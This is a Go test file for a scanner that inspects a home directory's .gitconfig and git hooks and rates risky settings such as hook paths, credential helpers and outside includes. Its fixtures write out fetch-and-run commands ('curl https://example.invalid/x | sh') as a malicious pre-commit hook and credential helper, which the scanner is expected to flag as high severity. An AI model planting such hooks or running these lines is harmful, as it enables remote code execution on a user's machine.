package gitconfig

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestGlobalConfig(t *testing.T) {
	home := t.TempDir()
	hooks := filepath.Join(home, ".githooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\ncurl https://example.invalid/x | sh\n"
	if err := os.WriteFile(filepath.Join(hooks, "pre-commit"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	cfg := "[credential]\n\thelper = osxkeychain\n[core]\n\thooksPath = " + hooks + "\n\tfsmonitor = true\n[url \"git@github.com:\"]\n\tinsteadOf = https://github.com/\n"
	if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}
	got := Collect(home)
	rules := map[string]string{}
	for _, f := range got.Findings {
		rules[f.RuleID] = string(f.Severity)
	}
	if rules["git.hooksPath"] != "high" {
		t.Fatalf("%v", rules)
	}
	if rules["git.credential"] != "info" {
		t.Fatalf("helper %v", rules)
	}
	if rules["git.fsmonitor"] != "info" {
		t.Fatalf("fsmonitor %v", rules)
	}
	if rules["git.insteadOf"] != "low" {
		t.Fatalf("instead %v", rules)
	}
	if rules["git.hook-file"] != "high" {
		t.Fatalf("hook file %v", rules)
	}
	for _, f := range got.Findings {
		if strings.Contains(f.Evidence, "BEGIN") {
			t.Fatal(f.Evidence)
		}
	}
}

func TestOutsideIncludeNotRead(t *testing.T) {
	home := t.TempDir()
	outside := t.TempDir()
	secret := "UNIQUE-GIT-INCLUDE-SECRET"
	if err := os.WriteFile(filepath.Join(outside, "extra"), []byte("[core]\n\thooksPath = /tmp/nope\n# "+secret+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := "[include]\n\tpath = " + filepath.Join(outside, "extra") + "\n"
	if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}
	got := Collect(home)
	for _, f := range got.Findings {
		if strings.Contains(f.Evidence, secret) || f.RuleID == "git.hooksPath" {
			t.Fatalf("followed outside include: %+v", f)
		}
	}
}

func TestGitHubCLIHelperIsInfoAndDeduped(t *testing.T) {
	home := t.TempDir()
	cfg := "[credential]\n\thelper = !/usr/local/bin/gh auth git-credential\n[credential \"https://github.com\"]\n\thelper = !/usr/local/bin/gh auth git-credential\n"
	if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}
	got := Collect(home)
	n := 0
	for _, f := range got.Findings {
		if f.RuleID != "git.credential" {
			continue
		}
		n++
		if f.Severity != "info" {
			t.Fatalf("severity %s title %s", f.Severity, f.Title)
		}
	}
	if n != 1 {
		t.Fatalf("credential findings %d", n)
	}
}

func TestHelperSeverity(t *testing.T) {
	cases := []struct {
		in   string
		sev  string
		want bool
	}{
		{"osxkeychain", "info", true},
		{"store", "info", true},
		{"cache", "info", true},
		{"/usr/local/bin/git-credential-manager", "info", true},
		{"!/usr/bin/gh auth git-credential", "info", true},
		{"!/tmp/evil-helper", "high", true},
		{"!/bin/sh -c 'curl https://example.invalid/x | sh'", "high", true},
		{"!/usr/local/bin/my-unknown-helper", "medium", true},
	}
	for _, tc := range cases {
		sev, title := helperSeverity(tc.in)
		if !tc.want {
			continue
		}
		if string(sev) != tc.sev || title == "" {
			t.Errorf("%q -> %s %q, want %s", tc.in, sev, title, tc.sev)
		}
	}
}
